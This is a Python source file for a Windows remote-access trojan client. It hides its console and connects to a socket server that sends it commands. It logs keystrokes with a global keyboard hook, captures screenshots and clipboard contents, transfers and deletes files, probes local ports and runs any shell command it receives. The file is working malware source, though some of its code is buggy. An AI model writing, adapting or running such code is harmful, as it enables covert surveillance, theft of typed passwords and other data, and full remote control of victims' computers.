import socket
import subprocess
import os
import win32console
import win32gui
import win32ui
import win32con
import win32api
import pythoncom
import pyWinhook as pyHook
import threading
import win32clipboard

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
keylogger = None


def on_keyboard_event(event):
    if event.Ascii == 5:
        exit(1)
    if event.Ascii != 0 or 8:
        try:
            f = open('output.txt', 'r+')
        except FileNotFoundError:
            f = open('output.txt', 'x+')
        buffer = f.read()
        f = open('output.txt', 'w+')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()


def start_keylogger(s):
    global keylogger
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()
    keylogger = threading.Thread(target=pythoncom.PumpMessages)
    keylogger.start()
    s.send('keylogger has started'.encode())


def end_keylogger(s):
    global keylogger
    keylogger.join()
    download(s, 'c:\output.txt')


def download(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(2048)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(2048)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())


def upload(s, path):
    with open(path, 'wb+') as f:
        while True:
            packet = s.recv(2048)
            if packet.endswith('DONE'.encode()):
                f.write(packet[:-4])
                f.close()
                break


def scan_ports(s):
    data = ''
    for i in range(20, 50000):
        result = s.connect_ex(('localhost', i))
        if result == 0:
            data += '[free]: i\n'
    data += 'DONE'
    s.send(data.encode())


def delete_file(s, path):
    os.remove(path)
    s.send('file removed on client machine!'.encode())


def extract_clipboard(s):
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    s.send(data.encode())


def take_screenshot(s):
    hdesktop = win32gui.GetDesktopWindow()

    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)

    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)

    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    screenshot.SaveBitmapFile(mem_dc, 'screenshot.bmp')
    download(s, 'screenshot.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


def start_client():
    s = socket.socket()
    s.connect(("127.0.0.1", 9001))

    while True:
        command = s.recv(2048)
        if 'get-ports' in command.decode():
            scan_ports(s)
        elif 'delete' in command.decode():
            _, path = command.decode().split("$")
            try:
                delete_file(s, path)
            except:
                pass
        elif 'start-keylogger' in command.decode():
            start_keylogger(s)
        elif 'end-keylogger' in command.decode():
            end_keylogger(s)
        elif 'download' in command.decode():
            _, path = command.decode().split("$")
            try:
               download(s, path)
            except:
                pass
        elif 'upload' in command.decode():
            _, path, content = command.decode().split("$")
            upload(s, path, content)
        elif 'get-screenshot' in command.decode():
            take_screenshot(s)
        elif 'extract-clipboard' in command.decode():
            extract_clipboard(s)
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())


if __name__ == '__main__':
    start_client()